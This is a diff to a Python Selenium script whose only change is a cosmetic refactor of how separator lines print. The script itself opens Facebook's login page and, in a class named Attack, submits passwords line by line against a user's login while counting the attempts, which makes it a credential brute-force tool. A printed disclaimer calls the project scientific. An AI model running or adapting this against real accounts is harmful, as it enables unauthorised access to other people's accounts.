@@ -2,18 +2,18 @@
 from selenium import webdriver
 import time
 
+def println(length=100, char='-'):
+    print("".join([char for _ in range(length)]))
 
 ## Author = [Przemysław Szmaj]
 ## GitHub = https://github.com/PSZMAJ
 ## YouTube = https://www.youtube.com/channel/UCewT7Lr5f6LWvqSPXm0JKRw
-print("****************************************************************************************************")
+println(100, '*')
 print("BREAKING IN IS ILLEGAL!/ WŁAMYWANIE SIĘ JEST NIELEGALNE!")
 print("The project was created for a scientific purpose, to check u2f operation)")
 print("Projekt powstał w celu naukowym, mającym sprawdzenie działania uwierzytelniania dwu/wieloetapowego.")
-print("****************************************************************************************************")
-print("")
-print("")
-print("")
+println(100, '*')
+print("\n\n")
 login = input('Please eneter login: ')
 browser = webdriver.Firefox()
 browser.get('https://www.facebook.com/login.php')
@@ -57,9 +57,9 @@ class Attack:
             self.button_login = browser.find_element_by_xpath('//*[@id="loginbutton"]')
             self.button_login.click()
             login_attempt = login_attempt + 1
-            print("____________________________________________________________")
+            println(60, '_')
             print(' Login attempt', login_attempt, ' with key/password : ', line )
-            print("____________________________________________________________")
+            println(60, '_')
         
 p = Attack()
 p.addlogin()
